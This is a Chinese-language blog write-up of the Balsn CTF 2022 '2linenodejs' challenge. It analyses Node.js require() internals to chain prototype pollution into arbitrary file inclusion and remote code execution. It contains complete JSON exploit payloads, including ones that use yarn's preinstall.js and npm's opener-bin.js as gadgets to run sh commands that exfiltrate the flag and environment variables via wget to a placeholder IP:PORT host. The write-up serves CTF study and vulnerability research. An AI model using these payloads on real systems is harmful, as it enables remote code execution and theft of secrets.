---
title: Node.js require() RCE复现
date: 2022-10-11 19:45:36
categories:
  - Web
---

# 前言

前阵子参加了Balsn CTF 2022，有道Node.js的题目叫2linenodejs，个人觉得思路十分巧妙，遂进行了完整的复现，收获颇多。下面是整个复现的过程。

题目代码如下：

```jsx
// server.js
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
  try{
    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
    obj = JSON.parse(json);
    console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
  }catch{
    require('./usage')
  }finally{
    process.exit();
  }
});

// index.js
module.exports=(O,o) => (Object.entries(O).forEach(([K,V])=>Object.entries(V).forEach(([k,v])=>(o[K]=o[K]||{},o[K][k]=v))), o);

// usage.js
console.log('Validate your JSON with <a href="/?{}">query</a>');
```

<!-- more -->

在try block里面将输入的JSON字符串转换为JavaScript对象，再使用一个遍历将对象的属性逐一赋给另一个空对象，很明显这里存在原型链污染。

预期思路是在读取JSON是产生异常，然后进入`catch`执行`require('./usage')`，通过`require()`方法实现RCE。

至于如何产生异常，方法是在JSON里面加一个项值为`null`，这样在遍历时`Object.entries(V)`为`null`，再调用`forEach`就会产生无法读取属性的异常。

![](https://pic.hujiekang.top/uploads/big/1ef4c30af22e5395cbd91445867954cf.png)

# `require()`任意文件包含执行

使用WebStorm对源码进行调试，在catch处下断点，然后传入输入：`?{"a":null} ` ，使用Force Step Into（快捷键Alt+Shift+F7）即可跳转到`require()`的源码继续调试：

![](https://pic.hujiekang.top/uploads/big/833303626430d6e575951907e6b00de9.png)

![](https://pic.hujiekang.top/uploads/big/e6504ae6d8855934525d3e417529666d.png)

最终定位到`Module._load`方法：

```jsx
Module._load = function(request, parent, isMain) {
  let relResolveCacheIdentifier;
  if (parent) {
    debug('Module._load REQUEST %s parent: %s', request, parent.id);
    // Fast path for (lazy loaded) modules in the same directory. The indirect
    // caching is required to allow cache invalidation without changing the old
    // cache key names.
    relResolveCacheIdentifier = `${parent.path}\x00${request}`;
    const filename = relativeResolveCache[relResolveCacheIdentifier];
    if (filename !== undefined) {
      const cachedModule = Module._cache[filename];
      if (cachedModule !== undefined) {
        updateChildren(parent, cachedModule, true);
        if (!cachedModule.loaded)
          return getExportsForCircularRequire(cachedModule);
        return cachedModule.exports;
      }
      delete relativeResolveCache[relResolveCacheIdentifier];
    }
  }

  if (StringPrototypeStartsWith(request, 'node:')) {
    // Slice 'node:' prefix
    const id = StringPrototypeSlice(request, 5);

    const module = loadBuiltinModule(id, request);
    if (!module?.canBeRequiredByUsers) {
      throw new ERR_UNKNOWN_BUILTIN_MODULE(request);
    }

    return module.exports;
  }

  const filename = Module._resolveFilename(request, parent, isMain);
```

`request`参数是可控的，其他两个均为写死的参数。因此第一个if无法控制直接跳过，第二个if判断要require的文件是不是Node内建模块，这里显然也不是，跳过。

下一步进入`Module._resolveFilename(request, parent, isMain)`：

```jsx
Module._resolveFilename = function(request, parent, isMain, options) {
  if (
    (
      StringPrototypeStartsWith(request, 'node:') &&
      BuiltinModule.canBeRequiredByUsers(StringPrototypeSlice(request, 5))
    ) || (
      BuiltinModule.canBeRequiredByUsers(request) &&
      BuiltinModule.canBeRequiredWithoutScheme(request)
    )
  ) {
    return request;
  }

  let paths;

  if (typeof options === 'object' && options !== null) {
    ......
  }

  if (request[0] === '#' && (parent?.filename || parent?.id === '<repl>')) {
    ......
  }

  // Try module self resolution first
  const parentPath = trySelfParentPath(parent);
  const selfResolved = trySelf(parentPath, request);
  if (selfResolved) {
    const cacheKey = request + '\x00' +
         (paths.length === 1 ? paths[0] : ArrayPrototypeJoin(paths, '\x00'));
    Module._pathCache[cacheKey] = selfResolved;
    return selfResolved;
  }
```

第一个if同样是判断内建模块的包含条件，跳过；第二个if检查`options`，调用的时候根本没传所以是`undefined`，跳过；第三个检查包含的文件名是不是以`#`开头，也不符合，跳过。

## `trySelf`中发现原型链污染

随后是两个方法`trySelfParentPath`和`trySelf`：

![](https://pic.hujiekang.top/uploads/big/e310b60a91d8bfff28a2804c33e0b9cb.png)

第一个方法参数不可控，返回的是调用`require()`方法的父模块路径，于是继续看第二个方法。

```jsx
function trySelf(parentPath, request) {
  if (!parentPath) return false;

  const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};

  ......
}
```

首先是`readPackageScope()`函数：

```jsx
function readPackageScope(checkPath) {
  const rootSeparatorIndex = StringPrototypeIndexOf(checkPath, sep);
  let separatorIndex;
  do {
    separatorIndex = StringPrototypeLastIndexOf(checkPath, sep);
    checkPath = StringPrototypeSlice(checkPath, 0, separatorIndex);
    if (StringPrototypeEndsWith(checkPath, sep + 'node_modules'))
      return false;
    const pjson = readPackage(checkPath + sep);
    if (pjson) return {
      data: pjson,
      path: checkPath,
    };
  } while (separatorIndex > rootSeparatorIndex);
  return false;
}

function readPackage(requestPath) {
  const jsonPath = path.resolve(requestPath, 'package.json');

  const existing = packageJsonCache.get(jsonPath);
  if (existing !== undefined) return existing;

  const result = packageJsonReader.read(jsonPath);
  const json = result.containsKeys === false ? '{}' : result.string;
  if (json === undefined) {
    packageJsonCache.set(jsonPath, false);
    return false;
  }

  try {
    const filtered = filterOwnProperties(JSONParse(json), [
      'name',
      'main',
      'exports',
      'imports',
      'type',
    ]);
    packageJsonCache.set(jsonPath, filtered);
    return filtered;
  } catch (e) {
    e.path = jsonPath;
    e.message = 'Error parsing ' + jsonPath + ': ' + e.message;
    throw e;
  }
}
```

函数会逐级检查脚本所在目录，如果有读取到最后一级目录名称为`node_modules`说明读取到了当前包的根目录，直接返回`false`；之后调用`readPackage()`函数会读取当前目录下的package.json文件，进行一定处理后返回。

此处目录下没有package.json，因此`readPackageScope()`函数会返回`false`。意味着对象`{data: pkg, path: pkgPath}`被赋值为空对象，很容易发现此处产生了原型链污染的可能性。

继续看下面的判断：

```jsx
if (!pkg || pkg.exports === undefined) return false;
if (typeof pkg.name !== 'string') return false;

let expansion;
if (request === pkg.name) {
  expansion = '.';
} else if (StringPrototypeStartsWith(request, `${pkg.name}/`)) {
  expansion = '.' + StringPrototypeSlice(request, pkg.name.length);
} else {
  return false;
}
```

这段判断要求：

- `pkg`是个对象，得有`exports`和`name`两个属性
- `exports`不能是`undefined`
- `name`必须是个字符串
- `name`要么与要包含的文件名相同，要么与文件名的起始部分相同

尝试构造JSON，即可通过if继续向下：

```json
{"__proto__":{"data":{"name":"./usage","exports":""},"path":""},"a":null}
{"__proto__":{"data":{"name":".","exports":""},"path":""},"a":null}
```

![](https://pic.hujiekang.top/uploads/big/3f5ebe9bb15117386b5f8db9b73b62ff.png)

![](https://pic.hujiekang.top/uploads/big/b18ce71c591fd1c390cfa9255ff40a03.png)

最后是一段try block：

```jsx
try {
    return finalizeEsmResolution(
			packageExportsResolve(
	      pathToFileURL(pkgPath + '/package.json'),
				expansion,
				pkg,
	      pathToFileURL(parentPath),
				cjsConditions
			), parentPath, pkgPath
		);
  } catch (e) {
    if (e.code === 'ERR_MODULE_NOT_FOUND')
      throw createEsmNotFoundErr(request, pkgPath + '/package.json');
    throw e;
  }
```

`pathToFileURL()`顾名思义，将路径转换为`file://`URL对象，仅做了字符串处理的操作，没发现什么可以操作的地方。于是进入`packageExportsResolve()`。

## `packageExportsResolve`

```jsx
function packageExportsResolve(
  packageJSONUrl, packageSubpath, packageConfig, base, conditions) {
  let exports = packageConfig.exports;
  if (isConditionalExportsMainSugar(exports, packageJSONUrl, base))
    exports = { '.': exports };

  if (ObjectPrototypeHasOwnProperty(exports, packageSubpath) &&
      !StringPrototypeIncludes(packageSubpath, '*') &&
      !StringPrototypeEndsWith(packageSubpath, '/')) {
    const target = exports[packageSubpath];
    const resolveResult = resolvePackageTarget(
      packageJSONUrl, target, '', packageSubpath, base, false, false, conditions
    );
```

根据函数逻辑，可以大概推断出`resolvePackageTarget()`进行了具体的包解析操作，除去开头这个if里面调用了，在函数的最末尾也进行了调用。

### 进入第一个`resolvePackageTarget`

函数第一个条件是`isConditionalExportsMainSugar()`函数，会对`exports`属性进行处理：

```jsx
function isConditionalExportsMainSugar(exports, packageJSONUrl, base) {
  if (typeof exports === 'string' || ArrayIsArray(exports)) return true;
  if (typeof exports !== 'object' || exports === null) return false;

  const keys = ObjectGetOwnPropertyNames(exports);
  let isConditionalSugar = false;
  let i = 0;
  for (let j = 0; j < keys.length; j++) {
    const key = keys[j];
    const curIsConditionalSugar = key === '' || key[0] !== '.';
    if (i++ === 0) {
      isConditionalSugar = curIsConditionalSugar;
    } else if (isConditionalSugar !== curIsConditionalSugar) {
      throw new ERR_INVALID_PACKAGE_CONFIG(
        fileURLToPath(packageJSONUrl), base,
        '"exports" cannot contain some keys starting with \'.\' and some not.' +
        ' The exports object must either be an object of package subpath keys' +
        ' or an object of main entry condition name keys only.');
    }
  }
  return isConditionalSugar;
}
```

- 如果`exports`是个对象，且所有属性名都不满足`key === '' || key[0] !== '.'`条件（所有属性名都以`.`开头），或者`exports`为`null`，函数返回`false`，`exports`保持原样
- 如果`exports`是字符串或者数组，或者`exports`是个对象且所有属性名都满足`key === '' || key[0] !== '.'`条件，函数返回`true`，此时为`exports`添加了一层`.`属性

总而言之，经过了这个判断后，`exports`对象最终的所有属性名一定是以`.`开头或就是`.`。

接下来判断`ObjectPrototypeHasOwnProperty(exports, packageSubpath)`，检查exports里面有没有名为`packageSubpath`的属性。而`packageSubpath`就是前一层调用的`expansion`变量。所以根据前面构造的JSON，也可以分为两种情况：

- `name`与要包含的文件名相同，此时`expansion`为`.`，此时`exports`无论怎么样都可以满足条件
- `name`为`.`，此时`expansion`为`./usage`，此时exports必须自己构造：`{"./usage":"data"}`

综上，Payload修改为以下：

```json
{"__proto__":{"data":{"name":"./usage","exports":"any"},"path":""},"a":null}
{"__proto__":{"data":{"name":".","exports":{"./usage":"any"}},"path":""},"a":null}
```

![](https://pic.hujiekang.top/uploads/big/2378e91435bac40a6c08205addb3d597.png)

![](https://pic.hujiekang.top/uploads/big/f3cae242b639f1dc4872bb3102d4b0a3.png)

### 进入第二个`resolvePackageTarget`

判断`ObjectPrototypeHasOwnProperty(exports, packageSubpath)`若为`false`，便会跳到函数的后半部分。

```jsx
let bestMatch = '';
  let bestMatchSubpath;
  const keys = ObjectGetOwnPropertyNames(exports);
  for (let i = 0; i < keys.length; i++) {
    const key = keys[i];
    const patternIndex = StringPrototypeIndexOf(key, '*');
    if (patternIndex !== -1 &&
        StringPrototypeStartsWith(packageSubpath,
                                  StringPrototypeSlice(key, 0, patternIndex))) {
      if (StringPrototypeEndsWith(packageSubpath, '/'))
        emitTrailingSlashPatternDeprecation(packageSubpath, packageJSONUrl,
                                            base);
      const patternTrailer = StringPrototypeSlice(key, patternIndex + 1);
      if (packageSubpath.length >= key.length &&
          StringPrototypeEndsWith(packageSubpath, patternTrailer) &&
          patternKeyCompare(bestMatch, key) === 1 &&
          StringPrototypeLastIndexOf(key, '*') === patternIndex) {
        bestMatch = key;
        bestMatchSubpath = StringPrototypeSlice(
          packageSubpath, patternIndex,
          packageSubpath.length - patternTrailer.length);
      }
    }
  }

  if (bestMatch) {
    const target = exports[bestMatch];
    const resolveResult = resolvePackageTarget(
      packageJSONUrl,
      target,
      bestMatchSubpath,
      bestMatch,
      base,
      true,
      false,
      conditions);
......
```

根据判断条件，`exports`的属性名需要包含`*`字符，且`*`字符前面的字符串必须和`expansion`的开头一致。据此可以构造以下`exports`：

- `"data":{"name":"./usage","exports":{".*":"any"}}, expansion="."`
- `"data":{"name":".","exports":{"./*":"any"}}, expansion="./usage"`

但是继续看下面的条件`packageSubpath.length >= key.length`，就可以发现第一个构造没法满足，因为这种情况下`key`最短只能是`.*`，去掉任何一个字符都会导致前面的判断没法通过，因此长度还是比`expansion`更大。因此只剩第二个能够通过：

![](https://pic.hujiekang.top/uploads/big/c2b43394b905b1f50557b9bbab1dab91.png)

调用：

![](https://pic.hujiekang.top/uploads/big/5e920cf3569c413950c5dada4d290a06.png)

于是进入`resolvePackageTarget()`函数。如果按照上面的Payload，显然直接进入第一个判断，调用`resolvePackageTargetString()`函数。而如果exports是传入的数组，那么则会进入下面一个判断，递归继续对数组每一个元素调用`resolvePackageTarget()`，最终还是进入调用`resolvePackageTargetString()`函数。

```jsx
function resolvePackageTarget(packageJSONUrl, target, subpath, packageSubpath,
                              base, pattern, internal, conditions) {
  if (typeof target === 'string') {
    return resolvePackageTargetString(
      target, subpath, packageSubpath, packageJSONUrl, base, pattern, internal,
      conditions);
  } else if (ArrayIsArray(target)) {
    if (target.length === 0) {
      return null;
    }
    // Recursive call
  }
......
```

## `resolvePackageTargetString`

```jsx
function resolvePackageTargetString(
  target, subpath, match, packageJSONUrl, base, pattern, internal, conditions) {

  if (subpath !== '' && !pattern && target[target.length - 1] !== '/')
    throwInvalidPackageTarget(match, target, packageJSONUrl, internal, base);

  if (!StringPrototypeStartsWith(target, './')) {
    if (internal && !StringPrototypeStartsWith(target, '../') &&
        !StringPrototypeStartsWith(target, '/')) {
      let isURL = false;
      try {
        new URL(target);
        isURL = true;
      } catch {
        // Continue regardless of error.
      }
      if (!isURL) {
        const exportTarget = pattern ?
          RegExpPrototypeSymbolReplace(patternRegEx, target, () => subpath) :
          target + subpath;
        return packageResolve(
          exportTarget, packageJSONUrl, conditions);
      }
    }
    throwInvalidPackageTarget(match, target, packageJSONUrl, internal, base);
  }

  if (RegExpPrototypeExec(invalidSegmentRegEx, StringPrototypeSlice(target, 2)) !== null)
    throwInvalidPackageTarget(match, target, packageJSONUrl, internal, base);

  const resolved = new URL(target, packageJSONUrl);
  const resolvedPath = resolved.pathname;
  const packagePath = new URL('.', packageJSONUrl).pathname;

  if (!StringPrototypeStartsWith(resolvedPath, packagePath))
    throwInvalidPackageTarget(match, target, packageJSONUrl, internal, base);

  if (subpath === '') return resolved;

  if (RegExpPrototypeExec(invalidSegmentRegEx, subpath) !== null) {
    const request = pattern ?
      StringPrototypeReplace(match, '*', () => subpath) : match + subpath;
    throwInvalidSubpath(request, packageJSONUrl, internal, base);
  }

  if (pattern) {
    return new URL(
      RegExpPrototypeSymbolReplace(
        patternRegEx,
        resolved.href,
        () => subpath
      )
    );
  }

  return new URL(subpath, resolved);
}
```

首先前两个判断都不会进入（第一个判断中`subpath !== ''`和`!pattern`不会同时满足，第二个判断中传进来的`internal`始终是`false`），然后是一个正则匹配（表达式太长了懒得看），正常的路径和文件名应该也不会匹配。

接下来就会将传入`JSON`中的`path`和`exports`代入最终包含的文件URL中。`target`对应`exports`中的文件名，`packageJSONUrl`对应文件所在路径（`路径+package.json`），最终返回URL对象。

如Payload：`{"proto":{"data":{"name":".","exports":{"./*":"./include.js"}},"path":"/home/dingzhen/Desktop/2linenodejs/src"},"a":null}`

解析结果：

![](https://pic.hujiekang.top/uploads/big/b51fc69b9050c589ef89ba0d4995f26a.png)

最终顺利包含执行文件（题目环境里无回显）：

![](https://pic.hujiekang.top/uploads/big/b67e802fa2e4e0087d593608cdd7725d.png)

## Payload总结

```jsx
{"__proto__":{"data":{"name":".","exports":{"./*":"./evil.js"}},"path":"/path/to/evil"},"a":null}
{"__proto__":{"data":{"name":".","exports":{"./usage":"./evil.js"}},"path":"/path/to/evil"},"a":null}
{"__proto__":{"data":{"name":"./usage","exports":["./evil.js"]},"path":"/path/to/evil"},"a":null}
{"__proto__":{"data":{"name":"./usage","exports":"./evil.js"},"path":"/path/to/evil"},"a":null}
```

# 寻找RCE Gadget

找到了本地文件包含之后，需要在本地搜索能够通过污染来触发RCE的JS文件。题目里的docker镜像为`node:18.8.0-alpine3.16`，使用下面的命令可以搜索包含了`child_process`的JS文件：

```bash
# For GNU grep
grep -rnw --include="*.js" "child_process" / 2>/dev/null
# For BusyBox grep which does not support "--include" argument
find / -name "*.js" -exec grep -H "child_process" {} \; 2>/dev/null
```

![](https://pic.hujiekang.top/uploads/medium/7e4557d8de087ace329d9e9d4abb3c89.png)

搜索到如下文件：

- /usr/local/lib/node_modules/npm/node_modules/builtins/index.js
- /usr/local/lib/node_modules/npm/node_modules/@npmcli/promise-spawn/lib/index.js
- /usr/local/lib/node_modules/npm/node_modules/node-gyp/lib/util.js
- /usr/local/lib/node_modules/npm/node_modules/node-gyp/lib/find-visualstudio.js
- /usr/local/lib/node_modules/npm/node_modules/node-gyp/lib/node-gyp.js
- /usr/local/lib/node_modules/npm/node_modules/node-gyp/lib/find-python.js
- /usr/local/lib/node_modules/npm/node_modules/opener/lib/opener.js
- /usr/local/lib/node_modules/npm/lib/commands/config.js
- /usr/local/lib/node_modules/npm/lib/commands/edit.js
- /usr/local/lib/node_modules/npm/lib/commands/help.js
- /opt/yarn-v1.22.19/lib/cli.js
- /opt/yarn-v1.22.19/preinstall.js

逐一检查，寻找调用点，过滤无用的文件，得到以下Gadget。

## preinstall.js

完整路径是/opt/yarn-v1.22.19/preinstall.js。这应该是最简单的一个了，首先这个文件不引用其他的第三方模块，可以独立运行，其次污染参数也相对容易。可以查到这个文件的Github提交记录：https://github.com/yarnpkg/yarn/pull/8343

```jsx
if (process.env.npm_config_global) {
    var cp = require('child_process');
    var fs = require('fs');
    var path = require('path');

    try {
        var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, 'bin', '-g'], {
            encoding: 'utf8',
            stdio: ['ignore', undefined, 'ignore'],
        }).replace(/\n/g, '');

        ......
    } catch (err) {
        // ignore errors
    }
}
```

首先，`process.env.npm_config_global`初始为`undefined`，直接污染为`1`即可进入条件。接下来就是调用`execFileSync`来执行命令，`process.execPath`为当前`node`可执行文件的绝对路径，这个不可控，但是`process.env.npm_execpath`同样可以被污染，此时借助`node`的`--eval/-e`参数就可以执行任意JS代码。

> ***e, -eval "script"***
>
>
> Evaluate the following argument as JavaScript. The modules which are predefined in the REPL can also be used in `script`.
>
> On Windows, using `cmd.exe` a single quote will not work correctly because it only recognizes double `"` for quoting. In Powershell or Git bash, both `'` and `"` are usable.
>

Payload：

```json
{
	"__proto__": {
		"data": {
			"name": "./usage",
			"exports": "./preinstall.js"
		},
		"path": "/opt/yarn-v1.22.19",
		"npm_config_global": 1,
		"npm_execpath": "--eval=require('child_process').execFile('sh',['-c','wget\thttp://IP:PORT/`/readflag`'])"
	},
	"a": null
}
```

除此之外，还可以使用`-r/--require`参数来包含环境变量，再污染`process.env`添加一个新环境变量包含代码来实现RCE。（此方法可能受其他环境变量中特殊字符干扰，不一定成功）

Payload：

```json
{
	"__proto__": {
		"data": {
			"name": "./usage",
			"exports": "./preinstall.js"
		},
		"path": "/opt/yarn-v1.22.19/",
		"npm_config_global": 1,
		"npm_execpath": "--require=/proc/self/environ",
		"env": {
			"A": "require('child_process').execFile('sh',['-c','wget\thttp://IP:PORT/`env`']);//"
		}
	},
	"a":null
}
```

## opener-bin.js

完整路径是/usr/local/lib/node_modules/npm/node_modules/opener/bin/opener-bin.js。

```jsx
#!/usr/bin/env node
"use strict";

var opener = require("..");

opener(process.argv.slice(2), function (error) {
    if (error) {
        throw error;
    }
});
```

这个文件是/usr/local/lib/node_modules/npm/node_modules/opener/lib/opener.js的唯一调用者。因为opener.js只导出了一个函数，直接包含没法执行。代码如下：

```jsx
"use strict";
var childProcess = require("child_process");
var os = require("os");

module.exports = function opener(args, options, callback) {
    var platform = process.platform;

    if (platform === "linux" && os.release().indexOf("Microsoft") !== -1) {
        platform = "win32";
    }

    var command;
    switch (platform) {
        case "win32": {
            command = "cmd.exe";
            break;
        }
        case "darwin": {
            command = "open";
            break;
        }
        default: {
            command = "xdg-open";
            break;
        }
    }

    if (typeof args === "string") {
        args = [args];
    }

    if (typeof options === "function") {
        callback = options;
        options = {};
    }

    if (options && typeof options === "object" && options.command) {
        if (platform === "win32") {
            args = [options.command].concat(args);
        } else {
            command = options.command;
        }
    }

    if (platform === "win32") {
        args = args.map(function (value) {
            return value.replace(/[&^]/g, "^$&");
        });
        args = ["/c", "start", "\"\""].concat(args);
    }

    return childProcess.execFile(command, args, options, callback);
};
```

注意到`if (typeof options === "function")`判断中将`options`赋值为空对象，在调用的时候，传入的`options`也确实是一个`function`，所以这个判断是一定会进入的。而下一个判断里面又取了`options.command`作为最终要执行的文件，也就说明这个`command`可以被污染。

接下来看命令执行的参数。`process.argv`默认为node的执行参数，一般是`node <当前执行的JS文件>`（如下图），因此`process.argv.slice(2)`相当于空数组，且无法被污染。

![](https://pic.hujiekang.top/uploads/big/70039966e61203b4c8573ac601e25194.png)

但是无回显RCE需要带出命令输出，单控制一个可执行文件无法控制参数显然无法达到目的。

直到看见另一个大佬写的EXP，恍然大悟，只能说思路太巧妙了：

![](https://pic.hujiekang.top/uploads/big/427725a846af4e02d905dd1d977a6d45.png)

他污染了一个名为`contextExtensions`的变量，一开始我还一头雾水，搜了一下发现这个变量是`vm.compileFunction()`方法中`options`参数中的一个属性：

![](https://pic.hujiekang.top/uploads/big/0bf642c495128db1d96aeab0f5bda5bb.png)

### 污染`contextExtensions`注入变量的原理

首先需要知道`vm`模块是干啥的。下面是官方的说明，这个模块是用于在V8虚拟机中直接编译和执行JS代码的：

> The `node:vm` module enables *compiling* and running code within V8 Virtual Machine contexts.
>
> **The `node:vm` module is not a security mechanism. Do not use it to run untrusted code.**

`vm.compileFunction()`方法用于将字符串形式的JS代码编译成一个`Function`对象。而`contextExtensions`可以在函数执行的上下文中添加额外的对象，相当于是对函数上下文的扩展。函数执行时调用到的对象值，若在`contextExtensions`中存在，则以`contextExtensions`中提供的值为准。

基于这个特性，再加上任何模块被`require()`包含执行JS代码的时候都会触发下面这个调用链，也就说明了VM上下文注入变量的可行性：

`require()`→`Module.require()`→`Module._load()`→`Module.load()`→`Module._compile()`

接下来是分析。首先看`Module.load()`的代码：

```jsx
Module.prototype.load = function(filename) {
  debug('load %j for module %j', filename, this.id);

  assert(!this.loaded);
  this.filename = filename;
  this.paths = Module._nodeModulePaths(path.dirname(filename));

  const extension = findLongestRegisteredExtension(filename);
  // allow .mjs to be overridden
  if (StringPrototypeEndsWith(filename, '.mjs') && !Module._extensions['.mjs'])
    throw new ERR_REQUIRE_ESM(filename, true);

  Module._extensions[extension](this, filename);
  this.loaded = true;
```

`findLongestRegisteredExtension()`是判断文件类型的函数，判断逻辑是只要文件后缀不在`Module._extensions`中则归为JS文件，否则直接返回对应类型。而`Module._extensions`中只有以下三种文件类型：

![](https://pic.hujiekang.top/uploads/big/83098f9a2ae8d75edbeb82d1269eecba.png)

所以只要包含的文件不是`.json`和`.node`后缀，都会进入`Module._extensions['.js']()`这个函数。这个函数的尾部调用了`Module._compile()`：

```jsx
Module.prototype._compile = function(content, filename) {
  let moduleURL;
  let redirects;
  if (policy?.manifest) {
    moduleURL = pathToFileURL(filename);
    redirects = policy.manifest.getDependencyMapper(moduleURL);
    policy.manifest.assertIntegrity(moduleURL, content);
  }

  maybeCacheSourceMap(filename, content, this);
  const compiledWrapper = wrapSafe(filename, content, this);
```

进入`wrapSafe()`函数：

```jsx
function wrapSafe(filename, content, cjsModuleInstance) {
  if (patched) {
    const wrapper = Module.wrap(content);
    return vm.runInThisContext(wrapper, {
      ......
      },
    });
  }
  try {
    return vm.compileFunction(content, [
      'exports',
      'require',
      'module',
      '__filename',
      '__dirname',
    ], {
      filename,
      importModuleDynamically(specifier, _, importAssertions) {
        const loader = asyncESM.esmLoader;
        return loader.import(specifier, normalizeReferrerURL(filename),
                             importAssertions);
      },
    });
  } catch (err) {
    if (process.mainModule === cjsModuleInstance)
      enrichCJSError(err, content);
    throw err;
  }
}
```

第一个条件判断，`patched`在文件开头默认赋值为`false`，故不会进入；于是后面调用`vm.compileFunction()`编译代码，`contextExtensions`就是在此处被污染的。

下图是WebStorm中展示的整个调用栈：

![](https://pic.hujiekang.top/uploads/big/49f0892d48457f5da9600254ce0b8939.png)

### 注入上下文变量 控制命令执行参数

理解了原理之后，下面就可以构造JSON来注入变量。根据Node.js文档的描述，`contextExtensions`是个`Object`数组，因此只需要往数组里再赋值一个`process.argv`，当函数执行时，对应的`process.argv`就会变成被注入的值。

```json
{
	"__proto__": {
		"data": {
			"name": "./usage",
			"exports": "./opener-bin.js"
		},
		"path": "./",
		"command": "wget",
		"contextExtensions": [{
			"process": {
				"argv": ["","","http://IP:PORT/a"]
			}
		}]
	},
	"a": null
}
```

调试进入opener-bin.js，发现变量`process.argv`确实已经被覆盖了：

![](https://pic.hujiekang.top/uploads/big/f8c6476ac197c87e76a19a2c9f639878.png)

接下来进入`opener`调用，对应执行的命令就是`wget http://IP:PORT/a`（因为取了`slice`，`argv`前两个项应该置空，真实参数从第三项开始）

![](https://pic.hujiekang.top/uploads/big/4861e69da2a77c9961b95adb9241d176.png)

# 参考资料

- http://doi.org/10.48550/arXiv.2207.11171
- https://gist.github.com/ginoah/e723a1babffae01ffa5149121776648c
- https://nodejs.org/api/vm.html
- https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/
